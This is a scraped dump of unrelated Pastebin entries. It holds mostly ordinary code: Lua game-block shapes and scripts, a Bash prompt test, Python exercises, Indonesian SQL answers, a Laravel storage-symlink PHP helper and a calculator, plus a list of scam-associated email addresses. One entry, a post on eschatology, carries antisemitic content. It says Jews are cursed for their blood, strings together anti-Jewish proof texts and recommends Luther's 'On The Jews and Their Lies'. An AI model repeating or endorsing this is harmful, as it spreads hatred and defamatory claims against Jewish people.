    { 6,12,6,10,13,7,texture = ""sky_drive:iron/iron_5"" },
    { 6,12,9,10,14,10,texture = ""sky_drive:iron/iron_5"" },
    { 8,12,5,9,14,7,texture = ""sky_drive:iron/iron_5"" },
    { 8,12,10,9,15,11,texture = ""sky_drive:iron/iron_5"" },
    { 10,12,6,11,14,10,texture = ""sky_drive:iron/iron_0"" },
    { 3,13,5,5,14,6,texture = ""sky_drive:iron/iron_5"" },
    { 3,13,6,5,14,10,texture = ""sky_drive:iron/iron_0"" },
    { 3,13,10,5,14,11,texture = ""sky_drive:iron/iron_5"" },
    { 5,13,6,9,14,7,texture = ""sky_drive:iron/iron_5"" },
    { 5,13,9,10,14,10,texture = ""sky_drive:iron/iron_5"" },
    { 9,13,5,11,14,6,texture = ""sky_drive:iron/iron_5"" },
    { 9,13,6,13,14,9,texture = ""sky_drive:iron/iron_0"" },
    { 9,13,10,11,14,11,texture = ""sky_drive:iron/iron_5"" },
    { 11,13,9,13,14,10,texture = ""sky_drive:iron/iron_0"" },
    { 13,13,7,14,14,9,texture = ""sky_drive:iron/iron_0"" },
    { 3,14,6,4,15,10,texture = ""sky_drive:iron/iron_5"" },
    { 4,14,5,9,15,6,texture = ""sky_drive:iron/iron_5"" },
    { 4,14,6,6,16,10,texture = ""sky_drive:iron/iron_0"" },
    { 4,14,10,9,15,11,texture = ""sky_drive:iron/iron_5"" },
    { 6,14,6,8,15,7,texture = ""sky_drive:iron/iron_5"" },
    { 6,14,7,15,16,9,texture = ""customnpcs:placeholder_1"", tint = 0x77dde7 },
    { 6,14,9,8,15,11,texture = ""sky_drive:iron/iron_5"" },
    { 8,14,6,12,15,7,texture = ""sky_drive:iron/iron_0"" },
    { 8,14,9,12,15,10,texture = ""sky_drive:iron/iron_0"" },
    { 3,15,7,4,16,9,texture = ""sky_drive:iron/iron_5"" },
    { 6,15,6,7,16,7,texture = ""sky_drive:iron/iron_5"" },
    { 6,15,9,7,16,10,texture = ""sky_drive:iron/iron_5"" },
    { 7,15,6,10,16,7,texture = ""sky_drive:iron/iron_0"" },
    { 7,15,9,10,16,10,texture = ""sky_drive:iron/iron_0"" },
  }
},

{
  label = ""Маяк"",
  lightLevel = 15,
  shapes = {
    { 4,0,6,6,1,10,texture = ""sky_drive:iron/iron_0"" },
    { 6,0,6,8,1,7,texture = ""sky_drive:iron/iron_0"" },
    { 6,0,7,15,7,9,texture = ""customnpcs:placeholder_1"", tint = 0x77dde7 },
    { 6,0,9,8,1,10,texture = ""sky_drive:iron/iron_0"" },
    { 12,0,6,14,2,7,texture = ""sky_drive:iron/iron_0"" },
    { 12,0,9,14,2,10,texture = ""sky_drive:iron/iron_0"" },
    { 4,1,7,6,2,9,texture = ""sky_drive:iron/iron_0"" },
    { 10,1,6,14,2,7,texture = ""sky_drive:iron/iron_0"" },
    { 10,1,9,14,2,10,texture = ""sky_drive:iron/iron_0"" },
    { 5,2,7,6,3,9,texture = ""sky_drive:iron/iron_0"" },
    { 8,2,6,12,3,7,texture = ""sky_drive:iron/iron_0"" },
    { 8,2,9,12,3,10,texture = ""sky_drive:iron/iron_0"" },
    { 5,3,6,8,5,7,texture = ""sky_drive:iron/iron_0"" },
    { 5,3,7,6,5,9,texture = ""customnpcs:npcCrystal"", tint = 0xff00cc },
    { 5,3,9,8,5,10,texture = ""sky_drive:iron/iron_0"" },
    { 8,3,6,10,4,7,texture = ""sky_drive:iron/iron_0"" },
    { 8,3,9,10,4,10,texture = ""sky_drive:iron/iron_0"" },
    { 12,4,6,14,6,7,texture = ""sky_drive:iron/iron_0"" },
    { 12,4,9,14,6,10,texture = ""sky_drive:iron/iron_0"" },
    { 5,5,7,6,7,9,texture = ""sky_drive:iron/iron_0"" },
    { 10,5,6,14,6,7,texture = ""sky_drive:iron/iron_0"" },
    { 10,5,9,14,6,10,texture = ""sky_drive:iron/iron_0"" },
    { 8,6,6,12,7,7,texture = ""sky_drive:iron/iron_0"" },
    { 8,6,9,12,7,10,texture = ""sky_drive:iron/iron_0"" },
    { 5,7,6,8,9,7,texture = ""sky_drive:iron/iron_0"" },
    { 5,7,7,6,9,9,texture = ""customnpcs:npcCrystal"", tint = 0x00ff66 },
    { 5,7,9,8,9,10,texture = ""sky_drive:iron/iron_0"" },
    { 6,7,7,14,8,9,texture = ""customnpcs:placeholder_1"", tint = 0x77dde7 },
    { 8,7,6,10,8,7,texture = ""sky_drive:iron/iron_0"" },
    { 8,7,9,10,8,10,texture = ""sky_drive:iron/iron_0"" },
    { 6,8,7,13,9,9,texture = ""customnpcs:placeholder_1"", tint = 0x77dde7 },
    { 5,9,7,6,11,9,texture = ""sky_drive:iron/iron_0"" },
    { 6,9,7,12,10,9,texture = ""customnpcs:placeholder_1"", tint = 0x77dde7 },
    { 5,10,6,6,11,10,texture = ""sky_drive:iron/iron_0"" },
    { 6,10,6,7,11,7,texture = ""sky_drive:iron/iron_0"" },
    { 6,10,7,11,11,9,texture = ""customnpcs:placeholder_1"", tint = 0x77dde7 },
    { 6,10,9,7,11,10,texture = ""sky_drive:iron/iron_0"" },
    { 5,11,6,6,12,7,texture = ""sky_drive:iron/iron_0"" },
    { 5,11,7,10,12,9,texture = ""customnpcs:placeholder_1"", tint = 0x77dde7 },
    { 5,11,9,6,12,10,texture = ""sky_drive:iron/iron_0"" },
    { 5,12,7,9,13,9,texture = ""customnpcs:placeholder_1"", tint = 0x77dde7 },
    { 4,13,7,6,16,9,texture = ""customnpcs:placeholder_1"", tint = 0x77dde7 },
    { 6,13,7,8,14,9,texture = ""customnpcs:placeholder_1"", tint = 0x77dde7 },
    { 6,14,7,7,15,9,texture = ""customnpcs:placeholder_1"", tint = 0x77dde7 },
  }
}"
1SACqrxe,Untitled,poxipox,Lua,Monday 26th of February 2024 02:42:04 AM CDT,"local function playerSkillSpellFix(cid)
	--local checkItem = getPlayerSlotItem(cid, CONST_SLOT_BONUS_BACKPACK).itemid
	if getPlayerSlotItem(cid, CONST_SLOT_BONUS_BACKPACK).itemid == 0 then
		local addSpecialBP = doPlayerAddItem(cid,9531, 1, false, CONST_SLOT_BONUS_BACKPACK)
		-- [] od konca
		
		
		doAddContainerItem(addSpecialBP,13557,1) -- [8] -1
		
		doAddContainerItem(addSpecialBP,13550,1) -- [1]
	

	end
end"
7r8C8S5S,read_key_test.sh,FranzVuttke,Bash,Monday 26th of February 2024 01:46:48 AM CDT,"#!/bin/bash

# pastebin https://pastebin.com/7r8C8S5S

# docs:
# https://unix.stackexchange.com/questions/111508/bash-test-if-word-is-in-set
# https://stackoverflow.com/questions/3601515/how-to-check-if-a-variable-is-set-in-bash

echo
echo -n ""Potwierdzasz?(T/n): ""
read answ


# commit=1
# # zawieranie się znaków w zbiorze alternatywa dla łańcucha warunków w instrukcji 'if'
# case $answ in
#     T|t) ;;
#     *)   commit=0;;
# esac
#
# echo ""commit: $commit""

# inny sposób:
# if [[ ""$answ"" =~ ^(t|T)$  ]]; then
#     echo ""Potwierdzenie""
# else
#     echo ""Rezygnacja""
# fi


# użytkownik nacisnął [ENTER] czyli w domyśle potwierdza 'T' albo 't'
if test -z ""$answ""; then
    echo ""Pusty znak w domyśle Potwierdzenie...""
    answ=""T""
fi
# https://stackoverflow.com/questions/3826425/how-to-represent-multiple-conditions-in-a-shell-if-statement

if [[ (""$answ"" = ""T"" || ""$answ"" = ""t"") ]]; then
# if test $answ = ""T"" || test $answ = ""t""; then
    echo ""Potwierdzenie""
else
    echo ""Rezygnacja""
fi

echo ""Podano: $answ""
"
XE3M8VAe,Sage,jamezaa1188,AutoIt,Monday 26th of February 2024 01:31:05 AM CDT,5920D44D-9B72-3FFD-20F8-05F446711641
9xusS4Sy,Untitled,h1n0t0r1,Python,Monday 26th of February 2024 01:29:14 AM CDT,"###### 1 Numbers 1-100 ######
for i in range(1, 101):
    print(i)

###### 2 Numbers 1-n step 3 ######
# Read user input
num = int(input())

# Logic
for i in range(1, num + 1, 3):
    print(i)

###### 3 Even power of 2  Ver 1 ######

# read user input
num = int(input())
result = 1
# Logic
for i in range(0, num + 1):
    if i % 2 == 0:
        print(result)
    result *= 2

###### 3 Even power of 2  Ver 2 ######
from  math import pow

# read user input
num = int(input())
# Logic
for i in range(0, num + 1, 2):
    print(int(pow(2, i)))

###### 3 Even power of 2  Ver 3 ######
# read user input
num = int(input())
result = 1
# Logic
for i in range(0, num + 1, 2):
    print(result)
    result = result * 2 * 2

###### 4 Numbers N-1 ######
# Read user input
num = int(input())
# Logic
for i in range(num, 0, -1):
    print(i)

###### 5 Character sequence ######
# Read user input
user_input = input()

# Logic
for i in range(0, len(user_input)):
    print(user_input[i])

###### 6 Vowels sum ######
# Read user input
user_input = input()
sum = 0
# Logic
for i in range(0, len(user_input)):
    temp_char = user_input[i]
    if temp_char == 'a':
        sum += 1
    elif temp_char == 'e':
        sum += 2
    elif temp_char == 'i':
        sum += 3
    elif temp_char == 'o':
        sum += 4
    elif temp_char == 'u':
        sum += 5

# Print Output
print(sum)

###### 7 Sum numbers ######
# Read user input
user_input = int(input())
sum = 0
# Logic
for i in range(user_input):
    temp_number = int(input())
    sum += temp_number

# Print Output
print(sum)

###### 8 Number sequence Ver 1 ######
# Read user input
user_input = int(input())
max_num = 0
min_num = 0
# Logic
for i in range(user_input):
    temp_int = int(input())
    if i == 0:
        max_num = temp_int
        min_num = temp_int
    else:
        if temp_int < min_num:
            min_num = temp_int
        if temp_int > max_num:
            max_num = temp_int

# Print Output
print(f'Max number: {max_num}')
print(f'Min number: {min_num}')

###### 8 Number sequence Ver 2 ######
# Read user input
user_input = int(input())
temp_int = int(input())
max_num = temp_int
min_num = temp_int
# Logic
for i in range(user_input - 1):
    temp_int = int(input())
    if temp_int < min_num:
        min_num = temp_int
    if temp_int > max_num:
        max_num = temp_int

# Print Output
print(f'Max number: {max_num}')
print(f'Min number: {min_num}')

###### 9 Left Right Sum ######
# Read user input
user_input = int(input())
left_sum = 0
right_sum = 0
# Logic
for i in range(user_input):
    temp_int = int(input())
    left_sum += temp_int

for i in range(user_input):
    temp_int = int(input())
    right_sum += temp_int

# Print Output

if left_sum == right_sum:
    print(f'Yes, sum = {left_sum}')
else:
    diff = abs(left_sum - right_sum)
    print(f'No, diff = {diff}')

###### 10 Odd Even Sum ######
# Read User input
user_input = int(input())
odd = 0
even = 0

# Logic
for i in range(user_input):
    temp_int = int(input())
    if i % 2 == 0:
        odd += temp_int
    else:
        even += temp_int

# Print Output
if odd == even:
    print('Yes')
    print(f'Sum = {odd}')
else:
    diff = abs(odd - even)
    print('No')
    print(f'Diff = {diff}')


"
1kbtMXq9,Jawaban Soal punya noorman,irsyad7798,PostgreSQL,Monday 26th of February 2024 01:19:44 AM CDT,"-- NO 1
SELECT
	nama,
	email,
	bulan_lahir,
	tanggal_registrasi 
FROM
	`rakamin_customer` 
WHERE
	( email LIKE '%@yahoo.com%' OR email LIKE '%rocketmail.com%' ) 
	AND tanggal_registrasi BETWEEN '2012-01-01' 
	AND '2012-03-31' 
	AND bulan_lahir IN ( 'Januari', 'Februari', 'Maret' );

-- NO 2
SELECT 
A.id_order, A.id_pelanggan,  A.harga,
(A.harga - (A.PPN * 100)) AS harga_setelah_ppn,
(
	CASE 
		WHEN (A.harga - (A.PPN * 100)) < 20000 THEN 'LOW'
		WHEN (A.harga - (A.PPN * 100)) > 20000 AND (A.harga - (A.PPN * 100)) < 50000 THEN 'MEDIUM'
		WHEN (A.harga - (A.PPN * 100)) > 50000 THEN 'HIGH'
END
) AS spending_bucket
FROM rakamin_order AS A;

-- NO 3
SELECT
	id_merchant,
	COUNT( id_order ) AS jumlah_order,
	SUM( harga ) AS jumlah_pendapatan 
FROM
	rakamin_order 
GROUP BY
	id_merchant 
ORDER BY
	SUM( harga ) DESC;

-- NO 4
SELECT
	metode_bayar,
	COUNT( id_order ) AS total_order 
FROM
	rakamin_order 
GROUP BY
	metode_bayar 
HAVING
	total_order > 10;

-- NO 5
SELECT
	kota,
	total_pelanggan 
FROM
	( SELECT kota, COUNT( id_pelanggan ) AS total_pelanggan FROM rakamin_customer_address GROUP BY kota ) AS Q 
WHERE
	total_pelanggan = ( SELECT MAX( total_pelanggan ) FROM ( SELECT kota, COUNT( id_pelanggan ) AS total_pelanggan FROM rakamin_customer_address GROUP BY kota ) Q ) UNION
SELECT
	kota,
	total_pelanggan 
FROM
	( SELECT kota, COUNT( id_pelanggan ) AS total_pelanggan FROM rakamin_customer_address GROUP BY kota ) AS Q 
WHERE
	total_pelanggan = (
	SELECT
		MIN( total_pelanggan ) 
	FROM
	( SELECT kota, COUNT( id_pelanggan ) AS total_pelanggan FROM rakamin_customer_address GROUP BY kota ) Q 
	);

-- NO 6
SELECT
	A.id_merchant,
	B.nama_merchant,
	A.metode_bayar,
	COUNT( A.id_order ) AS frekuensi 
FROM
	rakamin_order AS A
	JOIN rakamin_merchant AS B ON A.id_merchant = B.id_merchant 
GROUP BY
	id_merchant,
	B.nama_merchant,
	A.metode_bayar;
	
-- NO 7
SELECT
	A.id_pelanggan,
	B.nama,
	B.email,
	SUM( A.id_order ) AS kuantitas 
FROM
	rakamin_order AS A
	JOIN rakamin_customer AS B ON A.id_pelanggan = B.id_pelanggan 
GROUP BY
	A.id_pelanggan 
HAVING
	kuantitas > 5;


"
xDXDf6Lb,Eschatology,xspikex52,Bash,Monday 26th of February 2024 12:52:38 AM CDT,"Brief overview, starting with passages of the bible, and ending with a dozen resources for further study


First a basic philosophy and history lesson.  
>Jesus came to be the saviour of man, and indeed he was
>The jews rejected Him, rather wanting a physical ruler on the Earth instead of a spiritual King of Heaven.
>The second Temple was destroyed as a direct result of their rejection (Luke 21, Mark 13)
>Christianity started with faithful jews who believed and became Christians.  The rest vehemently rejected Jesus and Christians, to the point of curses and death (Literally just read the gospels and Acts, along with Titus, Galatians, etc)
>Rev 2:9, 3:9  Jeremiah 8:17, Matthew 3:7, Matthew 12:34, Matthew 23:33, Luke 3:7 
>Clearly God is aware of the animosity of these people, and gave us ample warnings
>Acts 4:12 ""Nor is there salvation in any other, for there is no other name under heaven given among men by which we must be saved.""  Salvation is of CHRIST ALONE.
>Dispensationlism has 2 core doctrines-  1, Jews will be saved apart from Christ because of their blood (contradicting Matthew 27:25, which if anything, would make them cursed for their blood) and 2, The church will fail to convert the world, and only the smallest remnant gets saved.  (Addressed largely below) 



# He put another parable before them, saying, “The kingdom of heaven is like a grain of mustard seed that a man took and sowed in his field. It is the smallest of all seeds, but when it has grown it is larger than all the garden plants and becomes a tree, so that the birds of the air come and make nests in its branches.”

# He told them another parable. “The kingdom of heaven is like leaven that a woman took and hid in three measures of flour, till it was all leavened.”
-Matthew 13:31-33

Here Jesus is saying the Kingdom of heaven will grow to be the biggest plant in the garden, and then again, he immediately follows up by saying it is like leaven and it will spread until the flour (the world) was ""ALL leavened."" 
*Not to be confused with universalism.  It is not that all are saved, but that the entire world is Christianized and ruled by Christendom.



# And Jesus came and said to them, “All authority in heaven and on earth has been given to me. Go therefore and make disciples of all nations, baptizing them in the name of the Father and of the Son and of the Holy Spirit, teaching them to observe all that I have commanded you. And behold, I am with you always, to the end of the age.”
-Matthew 28:18-20

Many things are being said here.  The most clear is the great commission.  The church is commanded to go and spread the gospel, to grow the Kingdom of heaven.  God makes it grow, but he uses us to do it.  He commands us to make disciples of ""ALL nations"" and he is with us, therefore failure is not an option.  The church does not fail, the Kingdom of God does not fail, it grows until it reaches its full extent.  Many OT passages point to this

See Psalms 2, 72, 110  https://biblehub.com/esv/psalms/2.htm
These are all about Jesus ruling the Earth, as he has been ever since he ascended.  He is sitting on the Throne, right now. See also Isaiah 2.  

#""The Lord swore to David an oath from which he will not turn back,""  
-Psalm 132:11

#""His dominion is an everlasting dominion[...] and his kingdom one that shall not be destroyed""
-Daniel 7:14


There is already a lot here, I may come back and edit to add to it, but for now it is a good start.  A crash course of sorts.  I will continue by listing many resources for those who have ears to hear... learning starts with humility.  We must accept that we are capable of being wrong in order to learn.  The love of truth must be the most important thing to us, and since Jesus said ""I am the way, the truth, and the life"" I do not think loving truth could possible be a bad thing.  Everything must be studied exegetically, but many who think they do this, are using a lens that culture gave them their entire lives and thus they are blind to its existence.  (See the 3rd video link below)


Videos:

A relatively longer set, but extremely accessible.  Well spoken, and clearly explained.  This pastor has friends who are Calvary Chapel, as he mentions in one of these sermons.  8 sermons, easy listening: 

https://www.youtube.com/playlist?list=PL_9qlOmzFeL6hfQ0vTiM2t4krlaUllJ_E


This list contains many sermons by a pastor who spent decades preaching Dispensationalism, but felt it on his heart to look deeper, and realized it was in error.  First two in the list are a great overview of eschatology for beginners, and only 2 hours to watch/listen to:

https://www.youtube.com/playlist?list=PLa8kQ5K23-dCjajo5RwEBEbRs9utA4s9Z


Single sermon about how having a particular lens affects everything you read in the bible and prevents exegetic study:

https://www.youtube.com/watch?v=Pc7MxwkeHbQ



Websites:

This website is full of information (and answers to objections, questions) and is run by one of the best exegetical teachers I have ever read.  His books are excellent too, see Gentry in the book list below
https://postmillennialworldview.com/2024/02/02/israel-and-gods-people-1/

Sermons about the Kingdom and Eschatology:
https://www.sermonaudio.com/search.asp?sourceOnly=true&currSection=sermonssource&keyword=chalcedon&subsetcat=series&subsetitem=Kingdom%2C+Church%2C+Eschatology


Books: 

Thy Kingdom Come: Studies in Daniel and Revelation
by Rushdoony, Rousas John

He Shall Have Dominion: A Postmillennial Eschatology
by Gentry, Kenneth L. Jr.

The Israel of God in Prophecy: Principles of Prophetic Interpretation
by Larondelle, Hans K.

An Eschatology of Victory
by Kik, J. Marcellus

Dispensationalism, Rightly Dividing the People of God?  | ***Heavily recommended for church leadership***
by Mathison, Keith A

Perilous Times: A Study in Eschatological Evil
by Gentry, Kenneth L. Jr.

Postmillennialsm Made Easy
by Gentry, Kenneth L. Jr.

The Book of Revelation Made Easy: You Can Understand Bible Prophecy
by Gentry, Kenneth L. Jr.

Before Jerusalem Fell: Dating the Book of Revelation
by Gentry, Kenneth L. Jr.

Jesus Victorious Kingdom
by Otis, John M.

On The Jews and Their Lies
by Martin Luther  (This book is extremely relevant to eschatology, as he explains a lot of it and how/why dispensationalism became popular 300 years after his death)


"
yS6MHQJF,Laravel Storage Symlinker,willysec_id,PHP,Monday 26th of February 2024 12:50:16 AM CDT,"<?php
$targetFolder = $_SERVER['DOCUMENT_ROOT'].'/storage/app/public/';
$linkFolder = $_SERVER['DOCUMENT_ROOT'].'/public/storage';
if(symlink($targetFolder,$linkFolder) || exec(""ln -s $targetFolder $linkFolder"") || shell_exec(""ln -s $targetFolder $linkFolder"") || passthru(""ln -s $targetFolder $linkFolder"") || system(""ln -s $targetFolder $linkFolder"")){
    echo '<pre>Laravel storage symlinker success!</pre>';    
}else{
    echo '<pre>SYMLINK FAILED! System not support or please delete storage folder that already create on public path.</pre>';
}

?>"
9dfgGyQ9,kalkulator.py,paperline27,Python,Monday 26th of February 2024 12:02:54 AM CDT,"import sys
import time
from termcolor import colored

def main():
    if len(sys.argv) < 4:
        print(colored(""Penggunaan: python kalkulator.py [operasi] [operand1] [operand2]"", ""red""))
        return
    
    operasi = sys.argv[1]
    operand1 = float(sys.argv[2])
    operand2 = float(sys.argv[3])

    print(""Melakukan perhitungan..."")
    time.sleep(1)

    if operasi == ""tambah"":
        hasil = operand1 + operand2
        print(colored(""Hasil penjumlahan: "" + str(hasil), ""green""))
    elif operasi == ""kurang"":
        hasil = operand1 - operand2
        print(colored(""Hasil pengurangan: "" + str(hasil), ""green""))
    elif operasi == ""kali"":
        hasil = operand1 * operand2
        print(colored(""Hasil perkalian: "" + str(hasil), ""green""))
    elif operasi == ""bagi"":
        if operand2 == 0:
            print(colored(""Error: Pembagian oleh nol tidak diperbolehkan."", ""red""))
        else:
            hasil = operand1 / operand2
            print(colored(""Hasil pembagian: "" + str(hasil), ""green""))
    else:
        print(colored(""Operasi tidak valid. Operasi yang tersedia: tambah, kurang, kali, bagi"", ""red""))

if __name__ == ""__main__"":
    main()"
1wUrc7JK,Nigerian scammers [25-2-1/2024],bombaires,AIMMS,Sunday 25th of February 2024 11:22:48 PM CDT,"<a href=""mailto:chiefeconomist.philiprlane@euro-ecb.com"">chiefeconomist.philiprlane@euro-ecb.com</a>
<a href=""mailto:christineodettelagarde.president@euro-ecb.com"">christineodettelagarde.president@euro-ecb.com</a>
<a href=""mailto:d45ad7b5b47b4eccaef1dea1c6d7e0b6.protect@withheldforprivacy.com"">d45ad7b5b47b4eccaef1dea1c6d7e0b6.protect@withheldforprivacy.com</a>
<a href=""mailto:telexcreditdeptz@hotmail.com"">telexcreditdeptz@hotmail.com</a>
<a href=""mailto:foreignremitancedept@hotmail.com"">foreignremitancedept@hotmail.com</a>
<a href=""mailto:royaloffshoretrustsbank@mail.com"">royaloffshoretrustsbank@mail.com</a>
<a href=""mailto:grahambells@comsultant.com"">grahambells@comsultant.com</a>
<a href=""mailto:trueassemblie@gmail.com"">trueassemblie@gmail.com</a>
<a href=""mailto:tru.e.a.s.se.mbl.i.e@gmail.com"">tru.e.a.s.se.mbl.i.e@gmail.com</a>
<a href=""mailto:t.r.ue.a.ss.e.mb.l.i.e@gmail.com"">t.r.ue.a.ss.e.mb.l.i.e@gmail.com</a>
<a href=""mailto:trueassem.bl.i.e@gmail.com"">trueassem.bl.i.e@gmail.com</a>
<a href=""mailto:t.r.u.ea.ssem.b.l.ie@gmail.com"">t.r.u.ea.ssem.b.l.ie@gmail.com</a>
<a href=""mailto:tr.uea.ssemb.lie@gmail.com"">tr.uea.ssemb.lie@gmail.com</a>
<a href=""mailto:tr.ue.a.s.s.em.b.l.ie@gmail.com"">tr.ue.a.s.s.em.b.l.ie@gmail.com</a>
<a href=""mailto:t.r.ueass.e.mb.l.ie@gmail.com"">t.r.ueass.e.mb.l.ie@gmail.com</a>
<a href=""mailto:t.r.ue.assem.bli.e@gmail.com"">t.r.ue.assem.bli.e@gmail.com</a>
<a href=""mailto:t.r.ueas.s.e.m.bl.ie@gmail.com"">t.r.ueas.s.e.m.bl.ie@gmail.com</a>
<a href=""mailto:t.ru.e.a.ssembl.i.e@gmail.com"">t.ru.e.a.ssembl.i.e@gmail.com</a>
<a href=""mailto:tr.u.ea.ss.e.m.b.li.e@gmail.com"">tr.u.ea.ss.e.m.b.li.e@gmail.com</a>
<a href=""mailto:true.a.sse.m.b.l.ie@gmail.com"">true.a.sse.m.b.l.ie@gmail.com</a>
<a href=""mailto:tr.ueass.emblie@gmail.com"">tr.ueass.emblie@gmail.com</a>
<a href=""mailto:tr.uea.s.sem.b.l.i.e@gmail.com"">tr.uea.s.sem.b.l.i.e@gmail.com</a>
<a href=""mailto:tr.uea.s.s.e.mb.lie@gmail.com"">tr.uea.s.s.e.mb.lie@gmail.com</a>
<a href=""mailto:trueas.s.em.bl.ie@gmail.com"">trueas.s.em.bl.ie@gmail.com</a>
<a href=""mailto:tr.u.ea.ss.e.mbl.i.e@gmail.com"">tr.u.ea.ss.e.mbl.i.e@gmail.com</a>
<a href=""mailto:t.ru.e.a.s.se.mb.l.i.e@gmail.com"">t.ru.e.a.s.se.mb.l.i.e@gmail.com</a>
<a href=""mailto:tr.u.eas.semb.l.i.e@gmail.com"">tr.u.eas.semb.l.i.e@gmail.com</a>
<a href=""mailto:t.ruea.s.s.e.mblie@gmail.com"">t.ruea.s.s.e.mblie@gmail.com</a>
<a href=""mailto:tr.u.e.a.ss.e.mb.l.ie@gmail.com"">tr.u.e.a.ss.e.mb.l.ie@gmail.com</a>
<a href=""mailto:t.r.u.e.a.s.s.em.b.l.i.e@gmail.com"">t.r.u.e.a.s.s.em.b.l.i.e@gmail.com</a>
<a href=""mailto:t.r.ueassem.bl.ie@gmail.com"">t.r.ueassem.bl.ie@gmail.com</a>
<a href=""mailto:t.ruea.s.semblie@gmail.com"">t.ruea.s.semblie@gmail.com</a>
<a href=""mailto:truea.ss.embl.i.e@gmail.com"">truea.ss.embl.i.e@gmail.com</a>
<a href=""mailto:tru.e.as.s.em.bl.ie@gmail.com"">tru.e.as.s.em.bl.ie@gmail.com</a>
<a href=""mailto:t.r.ue.a.s.se.mbl.i.e@gmail.com"">t.r.ue.a.s.se.mbl.i.e@gmail.com</a>
<a href=""mailto:t.r.ueassem.bl.i.e@gmail.com"">t.r.ueassem.bl.i.e@gmail.com</a>
<a href=""mailto:t.ru.eas.semblie@gmail.com"">t.ru.eas.semblie@gmail.com</a>
<a href=""mailto:t.r.uea.s.s.emblie@gmail.com"">t.r.uea.s.s.emblie@gmail.com</a>
<a href=""mailto:tr.u.eas.s.e.m.bli.e@gmail.com"">tr.u.eas.s.e.m.bli.e@gmail.com</a>
<a href=""mailto:t.r.ue.a.s.s.e.m.bl.ie@gmail.com"">t.r.ue.a.s.s.e.m.bl.ie@gmail.com</a>
<a href=""mailto:tr.u.e.a.s.s.em.b.li.e@gmail.com"">tr.u.e.a.s.s.em.b.li.e@gmail.com</a>
<a href=""mailto:t.rue.a.s.se.mb.l.i.e@gmail.com"">t.rue.a.s.se.mb.l.i.e@gmail.com</a>
<a href=""mailto:t.r.u.ea.s.sembl.i.e@gmail.com"">t.r.u.ea.s.sembl.i.e@gmail.com</a>
<a href=""mailto:tr.ue.a.s.se.m.b.l.i.e@gmail.com"">tr.ue.a.s.se.m.b.l.i.e@gmail.com</a>
<a href=""mailto:tru.e.asse.mb.lie@gmail.com"">tru.e.asse.mb.lie@gmail.com</a>
<a href=""mailto:tr.uea.s.sem.bli.e@gmail.com"">tr.uea.s.sem.bli.e@gmail.com</a>
<a href=""mailto:t.rue.a.s.s.e.m.bl.i.e@gmail.com"">t.rue.a.s.s.e.m.bl.i.e@gmail.com</a>
<a href=""mailto:t.ru.e.ass.e.m.b.li.e@gmail.com"">t.ru.e.ass.e.m.b.li.e@gmail.com</a>
<a href=""mailto:t.r.ue.a.sse.mbli.e@gmail.com"">t.r.ue.a.sse.mbli.e@gmail.com</a>
<a href=""mailto:true.a.s.sem.bl.i.e@gmail.com"">true.a.s.sem.bl.i.e@gmail.com</a>
<a href=""mailto:t.ruea.s.semb.l.ie@gmail.com"">t.ruea.s.semb.l.ie@gmail.com</a>
<a href=""mailto:t.r.u.e.a.s.s.em.bl.ie@gmail.com"">t.r.u.e.a.s.s.em.bl.ie@gmail.com</a>
<a href=""mailto:tr.u.ea.s.semb.l.ie@gmail.com"">tr.u.ea.s.semb.l.ie@gmail.com</a>
<a href=""mailto:t.ru.ea.ss.e.m.bl.i.e@gmail.com"">t.ru.ea.ss.e.m.bl.i.e@gmail.com</a>
<a href=""mailto:t.r.u.e.assem.b.l.ie@gmail.com"">t.r.u.e.assem.b.l.ie@gmail.com</a>
<a href=""mailto:t.rueas.sem.b.li.e@gmail.com"">t.rueas.sem.b.li.e@gmail.com</a>
<a href=""mailto:t.ruea.ss.e.m.blie@gmail.com"">t.ruea.ss.e.m.blie@gmail.com</a>
<a href=""mailto:t.r.ue.ass.em.bl.ie@gmail.com"">t.r.ue.ass.em.bl.ie@gmail.com</a>
<a href=""mailto:t.r.uea.ss.em.b.l.i.e@gmail.com"">t.r.uea.ss.em.b.l.i.e@gmail.com</a>
<a href=""mailto:t.r.ue.a.ss.e.mbl.i.e@gmail.com"">t.r.ue.a.ss.e.mbl.i.e@gmail.com</a>
<a href=""mailto:t.r.ue.a.ss.emb.lie@gmail.com"">t.r.ue.a.ss.emb.lie@gmail.com</a>
<a href=""mailto:t.r.u.eas.s.em.b.li.e@gmail.com"">t.r.u.eas.s.em.b.li.e@gmail.com</a>
<a href=""mailto:t.r.ue.a.s.sem.b.li.e@gmail.com"">t.r.ue.a.s.sem.b.li.e@gmail.com</a>
<a href=""mailto:tr.u.e.a.ssem.bl.i.e@gmail.com"">tr.u.e.a.ssem.bl.i.e@gmail.com</a>
<a href=""mailto:t.ru.e.a.s.s.e.m.bl.ie@gmail.com"">t.ru.e.a.s.s.e.m.bl.ie@gmail.com</a>
<a href=""mailto:tru.e.assemb.lie@gmail.com"">tru.e.assemb.lie@gmail.com</a>
<a href=""mailto:t.rueas.s.e.mb.lie@gmail.com"">t.rueas.s.e.mb.lie@gmail.com</a>
<a href=""mailto:t.ru.ea.ssemb.l.i.e@gmail.com"">t.ru.ea.ssemb.l.i.e@gmail.com</a>
<a href=""mailto:t.r.ue.a.s.semb.l.ie@gmail.com"">t.r.ue.a.s.semb.l.ie@gmail.com</a>
<a href=""mailto:t.r.ueassem.b.lie@gmail.com"">t.r.ueassem.b.lie@gmail.com</a>
<a href=""mailto:t.r.u.e.asse.m.b.l.i.e@gmail.com"">t.r.u.e.asse.m.b.l.i.e@gmail.com</a>
<a href=""mailto:true.a.s.s.e.mb.lie@gmail.com"">true.a.s.s.e.mb.lie@gmail.com</a>
<a href=""mailto:tr.ue.a.ss.embli.e@gmail.com"">tr.ue.a.ss.embli.e@gmail.com</a>
<a href=""mailto:t.r.ue.a.ss.embl.i.e@gmail.com"">t.r.ue.a.ss.embl.i.e@gmail.com</a>
<a href=""mailto:tru.e.a.ssemblie@gmail.com"">tru.e.a.ssemblie@gmail.com</a>
<a href=""mailto:tr.ueassemb.lie@gmail.com"">tr.ueassemb.lie@gmail.com</a>
<a href=""mailto:t.ru.eas.semb.l.ie@gmail.com"">t.ru.eas.semb.l.ie@gmail.com</a>
<a href=""mailto:tr.uea.s.se.mb.l.ie@gmail.com"">tr.uea.s.se.mb.l.ie@gmail.com</a>
<a href=""mailto:trueas.sem.b.li.e@gmail.com"">trueas.sem.b.li.e@gmail.com</a>
<a href=""mailto:true.as.s.e.m.b.l.ie@gmail.com"">true.as.s.e.m.b.l.ie@gmail.com</a>
<a href=""mailto:tr.ueas.s.e.m.b.lie@gmail.com"">tr.ueas.s.e.m.b.lie@gmail.com</a>
